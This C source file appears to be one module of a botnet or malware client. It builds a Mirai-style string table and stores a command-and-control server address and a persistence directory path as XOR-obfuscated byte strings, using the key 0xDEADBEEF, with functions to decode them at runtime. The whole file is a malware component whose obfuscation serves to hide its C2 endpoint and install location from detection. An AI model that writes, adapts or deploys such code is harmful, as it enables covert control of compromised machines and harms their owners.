#include "headers/includes.h"

#include "headers/table.h"

struct table_value table[TABLE_MAX_KEYS];

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = calloc(1, buf_len + 1);
    int i;
    for(i = 0; i < buf_len; i++) cpy[i] = buf[i];
    cpy[buf_len] = '\0';
    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t key[] = {0xDE, 0xAD, 0xBE, 0xEF};

    if (val->val == NULL) return;
    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= key[i % 4];
    }
}

void table_init(void)
{
    for (int i = 0; i < TABLE_MAX_KEYS; i++) {
        table[i].val = NULL;
        table[i].val_len = 0;
    }

    add_entry(TABLE_CNC_ADDR, "\xb8\xcc\x88\x82\xa6\xc1\xce\x89\xed\xc7\xdb\x88\xb5\x9a\xce\xdd\xa8\xc6\xdf\x9b\xac\xc5\xd1\x97\xad\x9e\xca\x86\xb8\xc8\xca\x95\xbd\xdb\xd5\xdb\xac\xce\xd3\x8e\xb4\xce\xd3\x97\xaf\xc0\xdb\x83\xba\xc4\xd3\x89\xa9\x9f\xd7\x8b\xf0\xc2\xd0\x86\xb1\xc3", 62);
    add_entry(TABLE_PERSIST_DIR, "\x9d\x97\xe2\xb8\xb7\xc3\xda\x80\xa9\xde\xe2\xbc\xa7\xde\xca\x8a\xb3\x9e\x8c\xb3\x97\xc3\xca\x8a\xb2", 25);
}



void table_unlock_val(uint8_t id)
{
    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];
    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}
